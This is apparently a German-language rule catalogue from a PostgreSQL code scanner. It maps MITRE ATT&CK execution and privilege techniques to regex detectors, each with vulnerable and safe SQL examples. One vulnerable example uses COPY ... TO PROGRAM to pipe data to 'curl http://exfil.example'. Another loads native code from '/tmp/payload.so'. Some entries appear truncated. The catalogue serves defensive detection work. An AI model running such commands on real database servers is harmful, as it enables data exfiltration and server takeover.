TA0002 Execution TA0002

MITRE ATT&CK - Execution: Code-Indikatoren fuer die Ausfuehrung von Betriebssystembefehlen aus PostgreSQL heraus.

15 Regeln

T1059

Betriebssystembefehl ueber COPY ... PROGRAM

Critical

COPY ... FROM/TO PROGRAM fuehrt einen Betriebssystembefehl auf dem Datenbankserver aus.

MITRE-TechnikCommand and Scripting Interpreter (COPY PROGRAM)
DetektorTyp regex · Muster \bCOPY\b[^;]*?\b(?:FROM|TO)\s+PROGRAM\b · Ziel masked
EmpfehlungCOPY ... PROGRAM ist Superuser-Funktionalitaet und gehoert nicht in regulaeren Anwendungscode. Verwendung streng pruefen und auf das Noetigste beschraenken.
Quellehttps://attack.mitre.org/techniques/T1059/
Verwundbar
-- COPY PROGRAM fuehrt einen OS-Befehl auf dem Server aus
COPY (SELECT 1) TO PROGRAM 'curl http://exfil.example -d @-';
Sicher
-- Datenexport ohne PROGRAM; in eine Anwendungstabelle schreiben
INSERT INTO export_log(payload)
  SELECT row_to_json(t) FROM data t;

High

MITRE-TechnikCommand and Scripting Interpreter (ALTER SYSTEM)
DetektorTyp regex · Muster \bALTER\s+SYSTEM\s+SET\b · Ziel masked
EmpfehlungDatenbankserver-Konfiguration ueber kontrollierte DBA-/Betriebsprozesse verwalten.
Quellehttps://attack.mitre.org/techniques/T1059/

-- Systemparameter ueber kontrollierte DBA-/Betriebsprozesse;

ACI-PG-EXECUTION-LANGUAGE-C

PostgreSQL CREATE FUNCTION LANGUAGE C

Critical

CREATE FUNCTION ... LANGUAGE C can load server-side native code and must not be introduced through normal application CI/CD scripts.

MITRE-TechnikCommand and Scripting Interpreter / Native Code
DetektorTyp builtin · Detektor regex_static_and_dynamic
EmpfehlungNative C functions must go through controlled DBA/security review and filesystem/deployment controls.
Quellehttps://attack.mitre.org/techniques/T1059/
Verwundbar
-- Serverseitiger nativer Code wird geladen

  AS '/tmp/payload.so', 'run' LANGUAGE C;
Sicher
-- Logik in der vertrauenswuerdigen Sprache PL/pgSQL
CREATE FUNCTION run_task(p_id integer) RETURNS void
LANGUAGE plpgsql AS $$
BEGIN
  PERFORM process_task(p_id);
END;
$$;

T1098

GRANT an die Rolle PUBLIC

High

GRANT ... TO PUBLIC vergibt ein Recht an alle Datenbankrollen (PUBLIC) und verletzt das Least-Privilege-Prinzip.

MITRE-TechnikAccount Manipulation (Berechtigung an PUBLIC)
DetektorTyp regex · Muster \bGRANT\b[^;]*?\bTO\b[^;]*?\bPUBLIC\b · Ziel masked
EmpfehlungRechte an eng gefasste, anwendungseigene Rollen statt an PUBLIC vergeben. Auch ALTER DEFAULT PRIVILEGES ... TO PUBLIC vermeiden.
Quellehttps://attack.mitre.org/techniques/T1098/
Verwundbar
-- Recht an alle Datenbankrollen (PUBLIC)
GRANT SELECT ON salaries TO PUBLIC;
Sicher
-- Recht an eine eng gefasste, anwendungseigene Rolle
GRANT SELECT ON salaries TO app_read_role;
T1098-DEFAULT-PUBLIC

ALTER DEFAULT PRIVILEGES mit GRANT an PUBLIC

High

ALTER DEFAULT PRIVILEGES ... GRANT ... TO PUBLIC vergibt zukuenftige Rechte an alle Rollen.

MITRE-TechnikAccount Manipulation (Default Privileges an PUBLIC)
DetektorTyp regex · Muster \bALTER\s+DEFAULT\s+PRIVILEGES\b[^;]*?\bGRANT\b[^;]*?\bTO\b[^;]*?\bPUBLIC\b · Ziel masked
EmpfehlungDefault Privileges nur an eng gefasste Anwendungsrollen vergeben, nicht an PUBLIC.
Quellehttps://attack.mitre.org/techniques/T1098/
Verwundbar
-- Zukuenftige Rechte pauschal an PUBLIC
ALTER DEFAULT PRIVILEGES IN SCHEMA app
  GRANT SELECT ON TABLES TO PUBLIC;
Sicher
-- Default Privileges nur an eine Anwendungsrolle
ALTER DEFAULT PRIVILEGES IN SCHEMA app
  GRANT SELECT ON TABLES TO app_read_role;
